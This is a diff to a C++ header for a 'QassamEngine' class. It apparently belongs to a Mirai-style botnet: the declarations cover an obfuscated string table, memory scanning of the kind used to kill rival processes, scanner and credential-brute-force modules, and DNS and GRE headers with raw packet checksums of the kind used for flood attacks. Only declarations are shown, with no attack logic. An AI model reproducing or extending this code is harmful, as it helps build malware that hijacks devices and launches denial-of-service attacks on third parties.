@@ -11,6 +11,9 @@
 #include <charconv>
 #include <unistd.h>
 
+#include "qassam_support.hh"
+#include "scanner/qassam_scanner.hh"
+
 
 
 // Dele Please Delete WTF!
@@ -186,9 +189,48 @@ inline constexpr int QASSAM_TABLE_HTTP_14 = 102;
 inline constexpr int QASSAM_TABLE_HTTP_15 = 103;
 inline constexpr int QASSAM_TABLE_MAX_KEYS = 31;
 
-class QassamEngine
+
+inline constexpr int QASSAM_PROTO_DNS_QTYPE_A = 1;
+inline constexpr int QASSAM_PROTO_DNS_QCLASS_IP = 1;
+
+inline constexpr int QASSAM_PROTO_TCP_OPT_NOP = 1;
+inline constexpr int QASSAM_PROTO_TCP_OPT_MSS = 2;
+inline constexpr int QASSAM_PROTO_TCP_OPT_WSS = 3;
+inline constexpr int QASSAM_PROTO_TCP_OPT_SACK = 4;
+inline constexpr int QASSAM_PROTO_TCP_OPT_TSVAL = 8;
+
+inline constexpr int QASSAM_PROTO_GRE_TRANS_ETH = 0x6558;
+
+class QassamDnsHdr
 {
     public:
+        uint16_t id, opts, qdcount, ancount, nscount, arcount;
+};
+
+class QassamDnsQuestion
+{
+    public:
+        uint16_t qtype, qclass;
+};
+
+class QassamDnsResource
+{
+    public:
+        uint16_t type, _class;
+        uint32_t ttl;
+        uint16_t data_len;
+} __attribute__((packed));
+
+class QassamGreHdr
+{
+    public:
+        uint16_t opts, protocol;
+};
+
+class QassamEngine : public QassamSupport, public QassamScanner, public QassamScannerConnection, public QassamScannerAuth
+{
+    public:
+        inline uint32_t x, y, z, w;
         char *val;
         uint16_t val_len;
     #ifdef DEBUG
@@ -202,18 +244,25 @@ class QassamEngine
         static bool qassam_memory_scan_match(char *);
         static bool qassam_has_exe_access(void);
         static bool qassam_mem_exists(char *, int, char *, int);
-        void qassam_rand_init(void);
-        uint32_t qassam_rand_next(void);
-        void qassam_rand_str(char *, int);
-        void qassam_rand_alpha_str(uint8_t *, int);
+        void qassam_rand_init(void) noexcept;
+        uint32_t qassam_rand_next(void) noexcept;
+        void qassam_rand_str(char *, int) noexcept;
+        void qassam_rand_alpha_str(uint8_t *, int) noexcept;
         void qassam_table_init(void);
         void qassam_table_unlock_val(uint8_t);
         void qassam_table_lock_val(uint8_t);
         char *qassam_table_retrieve_val(int, int *);
         static void qassam_add_entry(uint8_t, char *, int);
         static void qassam_toggle_obf(uint8_t);
+        uint16_t qassam_checksum_generic(uint16_t *, uint32_t);
+        uint16_t qassam_checksum_tcpudp(struct iphdr *, void *, uint16_t, int);
 
 };
+
+
+
+
+
 
 
 
